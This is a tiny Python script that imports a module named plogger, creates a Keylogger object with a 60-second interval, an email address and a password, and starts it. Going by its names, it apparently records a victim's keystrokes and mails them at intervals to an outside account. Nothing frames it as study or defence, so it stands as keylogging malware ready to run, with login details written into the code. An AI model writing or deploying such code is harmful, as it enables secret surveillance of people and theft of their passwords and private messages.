#!/usr/bin/env python
# encoding=utf8
import plogger

keylogger = plogger.Keylogger(60, "my.email@outlook.com", "abc123")
keylogger.start()